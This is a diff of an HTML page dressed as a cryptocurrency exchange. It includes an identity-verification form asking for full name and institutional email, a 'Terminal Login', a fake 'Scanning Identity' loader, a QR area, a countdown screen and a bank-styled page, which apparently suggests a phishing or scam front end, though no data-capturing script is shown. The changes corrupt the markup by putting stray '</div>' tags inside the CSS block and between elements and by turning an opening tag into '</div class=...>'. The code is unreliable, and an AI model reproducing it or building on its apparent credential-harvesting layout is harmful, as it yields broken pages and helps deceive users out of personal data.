@@ -8,37 +8,37 @@
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        
+       </div> 
         /* AUTH & MODALS */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
         .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
         .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
         .white-box { background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; text-align: center; }
-        
+    </div>    
         input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
         .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        
+     </div>   
         .loader-ring { display: inline-block; width: 50px; height: 50px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
+</div>
         /* SIDEBAR */
         #sidebar { width: 260px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
         .logo { font-size: 24px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; }
         .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
         .nav-item.active { background: var(--card); color: white; }
         .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
-
+</div>
         /* LAYOUT */
         #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
         header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
         main { flex: 1; padding: 30px; overflow-y: auto; }
-
+</div>
         .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
         th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
         td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
-
-        .qr-display-area { background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 20px auto; }
+</div>
+       .qr-display-area { background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 20px auto; }
         .wait-screen { position: fixed; inset: 0; background: #000; z-index: 200000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .timer-text { font-size: 50px; font-weight: bold; color: var(--yellow); font-family: monospace; margin: 20px 0; }
         .bank-page { background: white; color: black; max-width: 450px; margin: 30px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -54,7 +54,7 @@
         <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
         <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
-
+</div>
     <div class="auth-card" id="reg-box" style="display:none;">
         <h3>Verify Identity</h3>
         <input type="text" id="r-name" placeholder="Full Name">
@@ -67,14 +67,14 @@
         <input type="email" id="r-email" placeholder="Institutional Email">
         <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
     </div>
-
-    <div class="auth-card" id="login-box" style="display:none;">
+</div>
+    </div class="auth-card" id="login-box" style="display:none;">
         <h3>Terminal Login</h3>
         <input type="email" id="l-email" placeholder="Email Address">
         <input type="password" placeholder="Password">
         <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive </button>
     </div>
-
+</div>
     <div class="auth-card" id="otp-box" style="display:none;">
         <div id="otp-loading"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3></div>
         <div id="otp-final" style="display:none;">
@@ -106,7 +106,7 @@
             <button onclick="openModal()" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Connect</button>
         </div>
     </header>
-
+</div>
     <main>
         <div id="market-view" class="content-view">
             <h1>Market Overview (Rank 1-100)</h1>
